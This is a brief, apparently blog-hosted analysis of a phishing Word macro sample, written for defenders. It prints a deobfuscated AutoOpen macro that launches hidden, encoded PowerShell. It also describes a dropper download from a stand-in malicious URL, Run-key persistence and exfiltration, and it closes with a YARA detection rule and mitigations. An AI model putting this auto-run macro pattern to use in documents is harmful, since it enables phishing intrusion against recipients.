---
title: "Word Macro Malware Analysis"
image: "/XssHunter.jpg"
date: "2024-05-01"
category: "malware"
tags: ["malware", "macro", "word"]
description: "Analyzing a malicious Word document with embedded macros."
---

# üßæ Macro-Based Malware

This malware sample was delivered via a phishing email with the subject **"Urgent: Unpaid Invoice"** and attached file `invoice.doc`.

<Note>Never open suspicious Word documents on your host machine. Use a sandboxed VM or cloud sandboxing tools like Any.Run.</Note>

---

## üîç Static Analysis

The document contained heavily obfuscated VBA macros. The key function used to trigger execution was `AutoOpen`, which runs automatically when the document is opened.

To extract the macros:

```bash
olevba invoice.doc
Output:

AutoOpen found in Module1
Suspicious Keywords: Shell, CreateObject, Base64
<Note>Shell and CreateObject are clear indicators of malicious intent.</Note>

üî¨ Deobfuscated Code
After decoding Base64 strings and simplifying code:

```vba
Sub AutoOpen()
    Dim str As String
    str = "powershell -w hidden -enc aGVsbG8g..."
    Shell str, vbHide
End Sub
```

This macro launches a PowerShell command using Base64-encoded payloads.

üß† Payload Behavior
The decoded PowerShell performs:

- Dropper Activity: Downloads executable from http://malicious-site.com/dropper.exe
- Persistence: Adds itself to HKCU\Software\Microsoft\Windows\CurrentVersion\Run
- Data Exfiltration: Sends data to external server via HTTP POST

üõ°Ô∏è Detection & Mitigation

YARA Rule

```yara
rule WordMacro_Malware
{
  meta:
    description = "Detects malicious Word macros using Shell and AutoOpen"
    author = "GlitchViper"
  strings:
    $shell = "Shell"
    $auto = "AutoOpen"
    $create = "CreateObject"
  condition:
    all of them
}
```

Recommendations:
- Disable macros by default in Office
- Educate users on phishing awareness
- Use sandboxing solutions to auto-analyze attachments

<Note>Office documents should never require macros for invoices, resumes, or basic communication.</Note>

üèÅ Conclusion

Macro-based attacks continue to be a popular initial access vector. Despite being old, they remain effective due to:

- Social engineering
- Legacy systems
- Poor security hygiene

Always analyze Office attachments in secure environments and block macro execution wherever possible.